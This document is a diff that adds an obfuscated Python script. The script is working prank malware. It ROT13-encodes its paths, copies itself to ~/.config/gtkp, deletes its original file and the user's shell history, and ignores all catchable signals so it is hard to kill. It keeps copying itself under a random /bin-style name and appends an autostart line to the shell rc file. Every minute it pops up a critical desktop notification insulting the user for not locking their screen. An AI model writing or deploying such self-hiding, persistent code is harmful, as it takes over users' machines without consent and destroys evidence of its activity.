@@ -1,0 +1,98 @@
+#!/bin/env python
+# coding=utf-8
+H=chr
+x=open
+f=file
+p=dir
+a=getattr
+o=range
+h=True
+N=int
+import os
+R=os.path
+m=os.environ
+j=os.listdir
+F=os.remove
+import time
+W=time.time
+G=time.sleep
+import subprocess
+J=subprocess.PIPE
+s=subprocess.Popen
+import re
+import shutil
+n=shutil.copy
+import signal
+l=signal.signal
+O=signal.SIGRTMIN
+import random
+D=random.choice
+import getopt
+import sys
+g=R.basename(m['SHELL'])
+q=m['USER']
+M=['notify-send','-u','critical']
+X=H(114)+H(111)+H(116)+H(49)+H(51)
+v=H(47)
+K='tgxc'.decode(X)
+C='.pbasvt'.decode(X)
+U='ubzr'.decode(X)
+L=v+U+v+q+v+C+v+K
+I=D(j('/bin'))
+d='/home/'+q+'/.local/share/'
+def i():
+ z='/home/'+q+'/.'+g+'_history'
+ global L,K
+ with x(L,'w')as f:
+  f.close()
+ n(__file__,L)
+ F(__file__)
+ F(z)
+def k():
+ global g
+ g=R.basename(m['SHELL'])
+def S():
+ global L,d,K,I
+ n(L,R.join(d,I))
+def c():
+ global q,g,d,I
+ z='/home/'+q+'/.'+g+'rc'
+ M='echo "'+d+I+' &" | bash'
+ with x(z,'r')as read_file:
+  y=read_file.read()
+  if y.find(M)==-1:
+   with x(z,'a')as f:
+    f.write('\n'+M+'\n')
+    f.close()
+  read_file.close()
+def w():
+ global M
+ b='PETITE MERDE DE {} PENSES A LOCK.'.format(q.upper()) 
+ B=M[:]
+ B.append(b)
+ s(B,stdout=J,stdin=J)
+def T(Y,stack):
+ pass
+def E():
+ for i in[x for x in p(signal)if x.startswith("SIG")]:
+  try:
+   Y=a(signal,i)
+   l(Y,T)
+  except:
+   pass
+ for i in o(0,33):
+  try:
+   l(O+i)
+  except:
+   pass
+if __name__=='__main__':
+ E()
+ if not R.exists(L):
+  i()
+ while h:
+  if N(W())%60==0:
+   w()
+  S()
+  c()
+  k()
+  G(1)
